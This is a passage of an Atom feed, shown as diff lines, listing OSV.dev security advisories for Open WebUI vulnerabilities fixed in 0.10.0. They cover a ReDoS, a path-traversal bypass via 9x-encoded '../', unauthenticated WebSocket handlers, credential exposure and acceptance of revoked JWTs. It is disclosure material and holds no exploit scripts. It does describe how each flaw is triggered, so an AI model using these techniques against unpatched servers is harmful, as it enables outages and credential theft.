-1. **Scheduler did not re-gate the owner.** When a stored automation became due, `execute_automation()` rehydrated the owner with `Users.get_user_by_id(...)` and re-entered the chat completion pipeline without re-checking that the owner was still `use…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-mvx4-532p-xfm9"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-mvx4-532p-xfm9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59226"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59226&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/pull/26047"&gt;https://github.com/open-webui/open-webui/pull/26047&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/920b655f4689e2118de928fbc936f6ebd4fed396"&gt;https://github.com/open-webui/open-webui/commit/920b655f4689e2118de928fbc936f6ebd4fed396&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-mvx4-532p-xfm9"&gt;https://github.com/advisories/GHSA-mvx4-532p-xfm9&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3602"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3596: Open WebUI: ReDoS in skill-mention regexes causes whole-instance DoS on default config</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3596</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3596"/>
-    <published>2026-08-04T11:34:42Z</published>
-    <updated>2026-08-04T14:30:28Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59220"/>
-    <category term="GHSA-ffpj-xv5c-p3gw"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: ReDoS in skill-mention regexes causes whole-instance DoS on default config&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59220, GHSA-ffpj-xv5c-p3gw&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
-Two regexes in `backend/open_webui/utils/middleware.py` that parse `&amp;lt;$skillId|label&amp;gt;` skill-mention tags backtrack in O(n²) on input that contains `&amp;lt;$` followed by a long run with no closing `&amp;gt;`. Both run synchronously, on the asyncio event loop, on **every** chat completion with no feature gate. Because the default deployment is a single uvicorn worker, one such input pins a CPU core inside `re` and freezes the entire instance for all users until the worker is killed. Any authenticated user can trigger it with one chat message; it also fires accidentally on benign retrieved content (a RAG chunk or tool output) containing the pattern.
-
-## Affected versions
-`&amp;gt;= 0.9.2, &amp;lt; 0.10.0`. Fixed in **v0.10.0** (there is no 0.9.7 release).
-- `SKILL_MENTION_RE` (the extract pattern) has been …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-ffpj-xv5c-p3gw"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-ffpj-xv5c-p3gw&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59220"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59220&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/61a26722155ec6ee1b629cf8dfcf975098c18331"&gt;https://github.com/open-webui/open-webui/commit/61a26722155ec6ee1b629cf8dfcf975098c18331&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-ffpj-xv5c-p3gw"&gt;https://github.com/advisories/GHSA-ffpj-xv5c-p3gw&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3596"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3597: open-webui terminal proxy path traversal guard bypass via 9x encoded traversal</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3597</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3597"/>
-    <published>2026-08-04T11:34:43Z</published>
-    <updated>2026-08-04T14:30:28Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59221"/>
-    <category term="GHSA-frvj-c5qp-xj4w"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;open-webui terminal proxy path traversal guard bypass via 9x encoded traversal&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59221, GHSA-frvj-c5qp-xj4w&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;AI assistance was used to help inspect the code and prepare this report.
-
-## Summary
-
-The fix for GHSA-r2wg-2mcr-66rv is incomplete in v0.9.6 and current main. `backend/open_webui/routers/terminals.py` documents `_sanitize_proxy_path()` as decoding until stable, but the implementation stops after 8 `unquote()` passes. A 9x percent-encoded `../...` path parameter remains once-encoded after the loop, passes the `posixpath.normpath()` and `cleaned.startswith(&amp;#x27;..&amp;#x27;)` checks, and is forwarded to the configured terminal server. The upstream server then receives a decoded traversal path such as `/base/../admin/system`.
-
-## Impact
-
-A user who has access to an admin-configured terminal connection can bypass the terminal proxy path traversal guard and cause Open WebUI to forward requests with the con…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-frvj-c5qp-xj4w"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-frvj-c5qp-xj4w&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59221"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59221&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/pull/26050"&gt;https://github.com/open-webui/open-webui/pull/26050&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/05098d25a58d03738e01c4e85e8852c3b4ad849c"&gt;https://github.com/open-webui/open-webui/commit/05098d25a58d03738e01c4e85e8852c3b4ad849c&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-frvj-c5qp-xj4w"&gt;https://github.com/advisories/GHSA-frvj-c5qp-xj4w&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3597"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3599: Open WebUI: Unauthenticated WebSocket Access to Collaborative Document Handlers (ydoc:awareness:update, ydoc:document:leave)</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3599</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3599"/>
-    <published>2026-08-04T11:34:42Z</published>
-    <updated>2026-08-04T14:30:28Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59715"/>
-    <category term="GHSA-gmfw-g93r-vg53"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: Unauthenticated WebSocket Access to Collaborative Document Handlers (ydoc:awareness:update, ydoc:document:leave)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59715, GHSA-gmfw-g93r-vg53&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
-
-The Socket.IO server is configured with `always_connect=True` (lines 78, 91 in `backend/open_webui/socket/main.py`) and the `connect` handler (line 329) never rejects unauthenticated connections. Two Ydoc event handlers have zero authentication checks, allowing unauthenticated clients to interact with collaborative document sessions.
-
-## Vulnerable Code
-
-### `ydoc:awareness:update` (line 741) — No auth check at all
-```python
-@sio.on(&amp;#x27;ydoc:awareness:update&amp;#x27;)
-async def yjs_awareness_update(sid, data):
-    document_id = data[&amp;#x27;document_id&amp;#x27;]
-    user_id = data.get(&amp;#x27;user_id&amp;#x27;, sid)
-    update = data[&amp;#x27;update&amp;#x27;]
-    # No SESSION_POOL check, no room membership check
-    await sio.emit(
-        &amp;#x27;ydoc:awareness:update&amp;#x27;,
-        {&amp;#x27;document_id&amp;#x27;: document_id, &amp;#x27;user_id&amp;#x27;: user_id, &amp;#x27;update&amp;#x27;: upda…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-gmfw-g93r-vg53"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-gmfw-g93r-vg53&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59715"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59715&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/pull/25946"&gt;https://github.com/open-webui/open-webui/pull/25946&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/22f2fe1ffb66c993dad1e0b2b35514acaed2370e"&gt;https://github.com/open-webui/open-webui/commit/22f2fe1ffb66c993dad1e0b2b35514acaed2370e&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-gmfw-g93r-vg53"&gt;https://github.com/advisories/GHSA-gmfw-g93r-vg53&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3599"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3598: Open WebUI: /api/v1/channels/{id}/members exposes full user model including sensitive credentials</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3598</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3598"/>
-    <published>2026-08-04T11:34:43Z</published>
-    <updated>2026-08-04T14:30:28Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59222"/>
-    <category term="GHSA-gh7p-78x6-jw6m"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: /api/v1/channels/{id}/members exposes full user model including sensitive credentials&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59222, GHSA-gh7p-78x6-jw6m&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
-
-The channel members endpoint serializes and returns **full user models** for channel participants, including settings objects. A normal user in a DM can retrieve admin-only sensitive configuration such as webhook URLs and tool server key material (`settings.ui.toolServers[].key`), which is not available via standard user info APIs.
-
-### Details
-
-The endpoint GET `/api/v1/channels/{id}/members` returns the full serialized user model for every member in the channel. In both the DM and non-DM code paths, the handler constructs the response with `[UserModelResponse(**user.model_dump(), is_active=...)]` and returns it as the users list. Because `UserModel` (`models/users.py`) includes a settings object (`UserSettings`) and arbitrary UI configuration (`settings.ui`), the endpoint ex…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-gh7p-78x6-jw6m"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-gh7p-78x6-jw6m&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59222"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59222&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/fbcdcf146b99b5002705060a8243eee769108f9e"&gt;https://github.com/open-webui/open-webui/commit/fbcdcf146b99b5002705060a8243eee769108f9e&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-gh7p-78x6-jw6m"&gt;https://github.com/advisories/GHSA-gh7p-78x6-jw6m&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3598"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3595: Open WebUI: Realtime endpoints accept Redis-revoked JWTs after signout/backchannel logout</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3595</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3595"/>
-    <published>2026-08-04T11:34:42Z</published>
-    <updated>2026-08-04T14:30:28Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-59219"/>
-    <category term="GHSA-855v-hq7w-jmjw"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Open WebUI: Realtime endpoints accept Redis-revoked JWTs after signout/backchannel logout&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-59219, GHSA-855v-hq7w-jmjw&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;open-webui&lt;/code&gt; — fixed in 0.10.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
-
-With Redis configured, Open WebUI supports JWT revocation: `POST /api/v1/auths/signout` (per-token `jti`) and OIDC back-channel logout (per-user `revoked_at`) record revocations in Redis, and HTTP auth (`get_current_user`) rejects revoked tokens with 401. The realtime authentication surfaces do not perform this check: Socket.IO connect / user-join / join-channels / join-note and the terminal websocket first-message auth validate tokens with `decode_token()` only (signature + expiry). A JWT revoked by sign-out or back-channel logout therefore continues to authenticate new realtime connections, even though the same token is rejected on HTTP.
-
-## Affected component
-
-- `backend/open_webui/socket/main.py` — Socket.IO `connect`, `user-join`, `join-channels`, `join-note`
-- `backend/op…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-855v-hq7w-jmjw"&gt;https://github.com/open-webui/open-webui/security/advisories/GHSA-855v-hq7w-jmjw&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59219"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-59219&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/commit/33b91bd8ae8a100a5a306c91441a7d0b422c4cde"&gt;https://github.com/open-webui/open-webui/commit/33b91bd8ae8a100a5a306c91441a7d0b422c4cde&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui"&gt;https://github.com/open-webui/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0"&gt;https://github.com/open-webui/open-webui/releases/tag/v0.10.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/open-webui"&gt;https://pypi.org/project/open-webui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-855v-hq7w-jmjw"&gt;https://github.com/advisories/GHSA-855v-hq7w-jmjw&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3595"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
 </feed>
